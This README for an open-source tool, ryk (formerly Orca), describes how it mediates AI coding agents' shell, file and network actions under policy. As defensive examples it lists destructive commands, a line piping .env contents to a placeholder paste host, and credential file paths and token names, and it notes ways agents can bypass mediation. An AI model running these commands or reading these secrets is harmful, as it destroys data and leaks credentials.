# ryk &nbsp;[![Version](https://img.shields.io/badge/version-1.2.9-blue)](https://github.com/christopherkarani/rykan/releases) [![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE) [![Zig](https://img.shields.io/badge/built%20with-Zig-orange)](https://ziglang.org) [![Build](https://img.shields.io/github/actions/workflow/status/christopherkarani/rykan/build.yml?branch=main&label=build)](https://github.com/christopherkarani/rykan/actions/workflows/build.yml) [![Stars](https://img.shields.io/github/stars/christopherkarani/rykan?style=social)](https://github.com/christopherkarani/rykan)

# ryk

**The safety layer for autonomous AI agents running on real machines.**

*(Formerly **Orca**. The `orca` binary remains a PATH alias for one major. Workspace paths still use `.orca/` — path migration is a later phase.)*

ryk lets you give AI agents more autonomy by evaluating risky shell, file, network, and tool actions against your policy — when those actions actually pass through ryk’s mediation path.

AI agents are no longer just chatbots. They run shell commands, edit files, call APIs, access credentials, use tools, browse the web, and operate on laptops, servers, CI pipelines, and spare machines.

That is powerful.

It is also dangerous.

ryk is **graded mediation** (not a universal sandbox): it evaluates actions on paths it actually mediates. Day-1 path is Safe Launch — get protected, run your agent, diagnose, review the session. See [Protection grades](#protection-grades) for what that guarantee means.

```bash
# Install and configure protection
brew install christopherkarani/orca/ryk

# Run your agent
ryk claude
# or: ryk codex | ryk pi | ryk opencode | ryk openclaw | ryk hermes

# Diagnose · review last session · off-ramp
ryk doctor
ryk replay
ryk stop
```

This project is free and open source under Apache 2.0. If ryk is useful to you, please star the repository — it helps visibility and keeps development going.

---

## Why Orca exists

Developers and teams are starting to give autonomous agents real access:

* local files
* source code
* `.env` files
* SSH keys
* shell commands
* cloud CLIs
* databases
* browsers
* CI pipelines
* internal tools
* long-running workflows

Today, the safety model is usually one of these:

1. babysit every command
2. run the agent in Docker or a VM
3. write custom scripts and ignore files
4. trust the agent not to do something destructive

That does not scale.

Orca gives you a reusable policy layer across agents.

Write the rules once. Apply them everywhere.

---

## What Orca protects against

Orca focuses on the actions that can ruin your day:

```text
git push --force
git reset --hard
rm -rf
sudo
curl | sh
terraform destroy
kubectl delete
DROP TABLE
aws delete-*
gcloud delete
touching ~/.ssh
reading .env
leaking API keys
modifying protected config
sending data to unknown hosts
```

Orca can allow, deny, ask for approval, or log these actions depending on your policy.

---

## Before Orca

You give an agent a task:

> Clean this up and make it work.

The agent decides to run:

```bash
rm -rf ./src
```

or:

```bash
git reset --hard
```

or:

```bash
cat .env && curl https://paste.example.com
```

You find out after the damage is done.

---

## With Orca

The agent tries the same action.

Orca intercepts it first.

```text
Action blocked

Command:
rm -rf ./src

Reason:
Destructive recursive delete inside project directory.

Policy:
deny destructive file deletion

Result:
Command was not executed.
```

For actions that might be valid but risky, Orca asks in plain language:

```text
Approval required

Command:
git push origin main

Reason:
Pushing to a protected branch requires human approval.

  [a] Once — allow this time
  [A] Always this session
  [d] Never / Deny
```


---

## Core idea

Orca is not another AI agent.

Orca is the policy enforcement layer underneath the agents you already use.

```text
You
  ↓
Orca policy layer
  ↓
Hermes / Claude Code / Codex / OpenClaw / OpenCode / Cursor
  ↓
Shell / files / network / tools / cloud / databases
```

The agent can still do useful work.

Actions on a mediation path are evaluated against your policy. Paths that bypass mediation are outside that guarantee — see [Protection grades](#protection-grades) and [docs/threat-model.md](docs/threat-model.md).

---

## Supported agents

| Agent                  | Usage                                |
| ---------------------- | ------------------------------------ |
| Claude Code            | `ryk claude`                        |
| Codex CLI              | `orca codex`                         |
| Pi                     | `orca pi`                            |
| OpenCode               | `orca opencode`                      |
| OpenClaw               | `orca openclaw`                      |
| Hermes                 | `orca hermes`                        |
| Custom commands        | advanced: `ryk run -- <command>`     |

One policy file can protect multiple agents. Host aliases (`ryk <agent>`) are the taught launch path; `ryk run` is the advanced engine for custom commands and CI flags.

---

## Quick start (Safe Launch)

### 1. Install ryk

```bash
brew install christopherkarani/orca/ryk
```

Or use the install script:

```bash
curl -fsSL https://raw.githubusercontent.com/christopherkarani/rykan/main/scripts/install.sh | sh
```

---

### 2. Get protected

```bash
ryk start
```

`ryk start` is the only day-1 onboarding door. It creates a policy when missing (Ask on risk), wires host integrations, and verifies core readiness. Re-run it to repair or update hosts.

Then check the traffic light:

```bash
orca status
```

You should see **Protected** or **Limited**, plus a plain-language note that some paths can still bypass. Use `orca doctor` only when you need a deep capability matrix.

---

### 3. Run your agent

```bash
ryk claude
```

```bash
orca codex
```

```bash
orca hermes
```

When something looks risky, the interactive prompt offers **Once** / **Always** / **Never** — no rule ids required.

Review what happened:

```bash
orca replay
```

Bare `orca replay` shows the last session; denied actions are highlighted. Off-ramp:

```bash
ryk stop
```

For CI / automation (fails closed, no prompts), use the run engine:

```bash
orca run --ci -- ./scripts/agent-task.sh
```

---

## Protection grades

Orca is **graded mediation**, not a universal OS sandbox. Canonical definitions and bypass classes live in **[docs/compatibility.md](docs/compatibility.md#protection-grades-canonical)** (also linked from [docs/threat-model.md](docs/threat-model.md)).

| Grade | Meaning | Typical surface |
| --- | --- | --- |
| `hook` | Host invokes Orca and honors veto | Native plugin / host hook that fires |
| `wrapper` | PATH shims / agent launch under Orca | Finite executable list; absolute paths may bypass |
| `proxy` | Traffic must traverse an Orca proxy | MCP / optional network proxies |
| `OS-enforced` | Kernel/sandbox backend enforcing for that session | After protected child session-attach succeeds; doctor probes alone are not enough |

**Safe Launch default:** `ryk start` auto-selects the best available **Ask on risk** posture (hooks + wrappers when available). Day-1 status is **Protected | Limited | Off** with an honest caveat — not a grade matrix. **`OS-enforced`** FS isolation only after a successful Landlock (Linux) or Seatbelt (macOS) attach for that child.

Power users: `orca help --all` lists the full surface (`run`, `doctor`, `policy`, …).

---

## Try explain

See why a shell command would be blocked (no files are harmed):

```bash
ryk explain "rm -rf /"
```

Then inspect audit history:

```bash
ryk replay
ryk replay --only denied --verify
```

No AI agent required.

---

## Dashboard

Start the local dashboard:

```bash
orca dashboard
```

Open:

```text
http://127.0.0.1:7742
```

The dashboard shows:

* current policy status
* recent sessions
* prevented actions
* approval decisions
* replay verification
* audit integrity

Everything runs locally.

No cloud service is required.

---

## Use cases

### 1. Solo developer

Let Claude Code, Codex, or Hermes work longer without babysitting every command.

```bash
ryk start
ryk claude
```

Use Orca to ask (Once / Always / Never) before risky actions and block destructive ones.

---

### 2. Always-on Hermes machine

Run Hermes on a spare Mac mini, MacBook, VPS, or workstation with clearer boundaries.

Protect:

* important folders
* SSH keys
* `.env` files
* config files
* cloud credentials
* local databases
* browser-accessible workflows
* destructive shell commands

```bash
ryk start
orca hermes
```

---

### 3. Team policy

Commit Orca policy to your repo:

```text
.orca/policy.yaml
```

Now every developer and agent runs under the same safety rules.

No more one-off scripts per person.

---

### 4. CI and automation

Run autonomous agents in CI without interactive approval.

```bash
orca run --ci -- ./scripts/agent-task.sh
```

In CI, Orca converts `ask` into `deny`.

If the agent tries something dangerous, the job fails safely.

---

### 5. Red-team engine self-test

Run built-in fixture engine self-tests (internal `builtin:redteam` preset — not your workspace policy):

```bash
orca redteam --ci
```

This catches regressions in Orca’s fixture evaluators. It does **not** prove your installed policy, daemon, or host enforcement is correct. See [docs/redteam.md](docs/redteam.md).

---

## Security model

Orca is designed to be honest about what it does and does not protect.

### What Orca does (when mediation is active)

* launches agents through a policy-controlled process (`ryk <agent>` / wrapper grade; `orca run` is the engine)
* evaluates shell commands that hit PATH shims or host hooks that fire and honor veto
* mediates file access on Orca-mediated write paths (staged writes; OS FS enforcement only after session-attach succeeds)
* filters sensitive environment variables for Orca-launched children
* detects secret-like access patterns on mediated paths and redacts audit output
* applies network **decisions** for mediated traffic; blocks only when a proxy or OS-enforced backend is actually in path
* records tamper-evident audit logs for Orca-managed sessions
* supports replayable sessions
* fails closed in CI mode for evaluated actions

### What Orca does not claim

Orca is not a perfect kernel sandbox and is not universal transparent FS/network interception.

It does not protect agents that are not launched through Orca (or host hooks that do not fire).

It does not replace Docker, VMs, OS permissions, VPNs, SSH hardening, or least-privilege infrastructure.

Use those too.

Orca is a graded, behavior-level policy layer on top of paths it actually mediates — see [Protection grades](#protection-grades).

Docker controls the environment.

Orca controls what the agent is allowed to do on mediated paths inside that environment.

---

## Policy modes

| Mode      | Behavior                            |
| --------- | ----------------------------------- |
| `observe` | log decisions with minimal blocking |
| `ask`     | ask before risky actions            |
| `strict`  | block aggressively                  |
| `ci`      | never prompt, deny risky actions    |

Example:

```yaml
mode: ask
```

For automation:

```bash
orca run --ci -- ./scripts/agent-task.sh
```

---

## Audit and replay

After each session, Orca stores a local audit trail.

Last session timeline (denials highlighted):

```bash
orca replay
```

Denied actions only / verify integrity / JSON:

```bash
orca replay --only denied
orca replay --verify
orca replay --json
```

Session artifacts live under:

```text
.orca/sessions/
```

Audit logs are tamper-evident using chained hashes.

---

## Credential and secret protection

Orca can block or redact access to sensitive files and values.

Examples:

```text
.env
~/.ssh/id_rsa
~/.ssh/id_ed25519
AWS_ACCESS_KEY_ID
GITHUB_TOKEN
ANTHROPIC_API_KEY
OPENAI_API_KEY
Google service account JSON
JWTs
private keys
high-entropy tokens
```

Agent-primary launches (`ryk claude`, `ryk codex`, `ryk pi`, `ryk opencode`, `ryk openclaw`, and `ryk hermes`) default to an empty-backpack child environment. Granted Anthropic/OpenAI keys become session-only phantoms and a ryk-owned loopback gateway performs the fixed-host swap outside the agent. Host login remains preferred. Custom commands can opt in explicitly, and the host-secret escape is loud:

```bash
ryk run --secretless -- <custom-command>
ryk run --with-host-secrets -- claude
```

See [docs/credentials.md](docs/credentials.md).

---

## Native plugins

Safe Launch (`ryk start` + `ryk <agent>`) wires the usual wrapper path and host hooks when available. Wrapper mediation is **not** OS-enforced by default and is not automatically stronger than a host **`hook`** that actually fires and honors veto — those grades stack when both are active. Kernel-level FS strength requires **`OS-enforced`** session-attach (successful Landlock/Seatbelt child attach; doctor probes alone do not claim a live session).

Some agents also support native plugins or hooks for deeper integration (grade **`hook`** when hooks fire and honor veto). Prefer `ryk start` for first-time host wiring.

### Hermes

```bash
ryk start --hosts hermes
# or repair later:
orca plugin install hermes --yes
hermes plugins enable orca
orca plugin doctor hermes
```

### OpenClaw

**Supported protection path** (grade **`wrapper`**):

```bash
orca openclaw
```

Optional plugin install (local path / `orca plugin install openclaw`) is install plumbing only — it does **not** prove **`hook`** enforcement. npm, ClawHub, and CLI-metadata loads of the native plugin are **`unprotected`**: OpenClaw currently no-ops `api.on`, so tool hooks do not fire and cannot block. See [`integrations/openclaw-plugin/README.md`](integrations/openclaw-plugin/README.md) and [protection grades](#protection-grades).

---

## Why not just Docker?

Docker is useful.

You should use it where it makes sense.

But Docker and Orca solve different problems.

Docker controls what the process can access.

Orca controls what the AI agent is allowed to do.

An agent inside Docker can still:

* delete mounted project files
* read secrets mounted into the container
* push code
* run destructive migrations
* call cloud CLIs
* modify config
* exfiltrate data over allowed network paths

Orca adds behavior-level policy, approvals, and auditability on top of your existing isolation.

---

## Why not write custom scripts?

Many developers already do.

They write:

* ignore files
* command filters
* approval scripts
* read-only config hacks
* custom wrappers
* shell aliases
* one-off security prompts

That works until every agent, repo, machine, and teammate needs a different version.

Orca turns those guardrails into a reusable policy layer.

---

## Roadmap

Near-term focus:

* stronger default policy packs
* Hermes-specific protections
* cloud delete protections
* database delete protections
* protected config policies
* approval workflows
* team policy sharing
* CI enforcement
* better replay reports

Longer-term:

* centralized team dashboard
* organization-wide policy management
* SSO/RBAC
* policy marketplace
* enterprise audit exports
* agent security sprints

---

## Documentation

* [Install](docs/install.md)
* [Quickstart (Safe Launch)](docs/quickstart.md)
* [Policy reference](docs/policy.md)
* [Credentials](docs/credentials.md)
* [Replay](docs/replay.md)
* [Commands](docs/commands.md)
* [Plugin security model](docs/integrations/plugin-security-model.md)
* [Plugin troubleshooting](docs/integrations/plugin-troubleshooting.md)

Default CLI help teaches Safe Launch only; full surface: `orca help --all`.

---

## Development

```bash
./scripts/zig build
./scripts/zig build test
./zig-out/bin/orca help
./zig-out/bin/orca redteam --ci
```

---

## Project status

Orca is early, open source, and actively evolving.

Current focus:

1. stop irreversible agent actions
2. protect secrets and sensitive files
3. provide shared policy across agents
4. give users replayable evidence of what happened
5. make autonomous agents safer without making them useless

Feedback, issues, PRs, and roasts are welcome.

If Orca helps you, please leave a star. It genuinely motivates continued work.
